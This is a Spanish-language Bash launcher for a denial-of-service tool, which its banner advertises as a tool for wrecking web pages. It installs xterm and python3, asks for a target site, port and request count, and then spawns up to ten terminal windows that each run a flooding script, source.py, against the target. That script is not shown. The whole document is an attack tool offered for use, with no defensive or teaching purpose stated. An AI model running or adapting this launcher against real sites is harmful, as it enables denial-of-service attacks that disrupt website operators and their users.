white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"

echo -e "$Cafe######################################################$nc"

echo -e "$Cafe## \e[31m███╗   ███╗ █████╗ ██████╗ ████████╗██╗███╗   ██╗$Cafe##"
echo -e "$Cafe## ████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝██║████╗  ██║$Cafe##"        
echo -e "$Cafe## \e[31m██╔████╔██║███████║██████╔╝   ██║   ██║██╔██╗ ██║$Cafe##"
echo -e "$Cafe## ██║╚██╔╝██║██╔══██║██╔══██╗   ██║   ██║██║╚██╗██║$Cafe##"
echo -e "$Cafe## \e[31m██║ ╚═╝ ██║██║  ██║██║  ██║   ██║   ██║██║ ╚████║$Cafe##"
echo -e "$Cafe## ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝$Cafe##"
                                                 
  
echo -e "$Cafe##############################################################################$nc"
echo -e "$red##-------------La herramienta mas poderosa para destrosar paginas web$red.......##"
echo -e "$Cafe##############################################################################$nc"
echo -e "$Cyan Creador :-Martin Lopez$nc"




                                                                                
if xterm -version &>/dev/null; then
    echo -e "$xterm púrpura está instalado ✅ $nc"
else
echo -e "\e[94mXTERM se esta instalando.......\e[0m"
progressbar()
{
    bar="##################################################"
    barlength=${#bar}
    n=$(($1*barlength/100))
    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
}


pid=$!

apt-get install xterm > /dev/null

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done 
# kill the spinner task
kill $pid > /dev/null 2>&1
echo $'\n*\n*\n\e[97mXTERM Instalado con éxito en su sistema operativo\e[0m'
fi  
if command -v python3 &>/dev/null; then
    echo -e "$purple Python 3 está instalado ✅$nc"
else

echo -e "\e[94mPython3 se esta instalando.......\e[0m"
progressbar()
{
    bar="##################################################"
    barlength=${#bar}
    n=$(($1*barlength/100))
    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
}


pid=$!

apt-get install python3 > /dev/null

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done  
# kill the spinner task
kill $pid > /dev/null 2>&1 
echo $'\n*\n*\n\e[97mPython3 instalado con éxito en su sistema operativo\e[0m'
fi
read -p $'\033[0;37mpagina  \e[0m    :- ' web
read -p $'\033[0;37mpuerto \e[0m     :- ' port
read -p $'\033[0;37msolicitudes\e[0m :- ' thread

echo "##################################################################"
echo -e "#$red    $nc|$red        $nc                                                   #"
echo "##################################################################"
echo -e "#$yellow  1 :un       DDOS Attack                                          $nc#"
echo -e "#$yellow  2 :Dos      DDOS Attack                                          $nc#" 
echo -e "#$yellow  3 :Tres     DDOS Attack $nc $red DDDD  DDDD                             $nc#"
echo -e "#$yellow  4 :Cuatro   DDOS attack $nc $red D   D D   D       SSSS                 $nc#"
echo -e "#$yellow  5 :Cinco    DDos attack $nc $red D   D D   D  OOO  S                    $nc#"
echo -e "#$yellow  6 :Seis     DDOS attack $nc $red D   D D   D O   O SSSS                 $nc#"
echo -e "#$yellow  7 :Siete    DDOS attack $nc $red D   D D   D O   O    S                 $nc#"
echo -e "#$yellow  8 :ocho     DDOS attack $nc $red DDDD  DDDD   OOO  SSSS                 $nc#"
echo -e "#$yellow  9 :Nueve    DDOS attack                                          $nc#"
echo -e "#$yellow 10 :diez     DDOS attack                                          $nc#"
echo "##################################################################"
echo -e "---------------------------"
read -p "Ingresa un numero de terminales para el ataque   :- " SA



if [ $SA = 1 ]; then
xterm -e python3 source.py -s $web -p $port -t $thread &
fi

if [ $SA = 2 ]; then
for i in {1..2}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done


fi
if [ $SA = 3 ]; then
for i in {1..3}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 4 ]; then
for i in {1..4}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
if [ $SA = 5 ]; then
for i in {1..5}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
if [ $SA = 6 ]; then
for i in {1..6}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 7 ]; then
for i in {1..7}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 8 ]; then
for i in {1..8}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 9 ]; then
for i in {1..9}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 10 ]; then
for i in {1..10}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
echo "$red DDOS cerrado $nc"




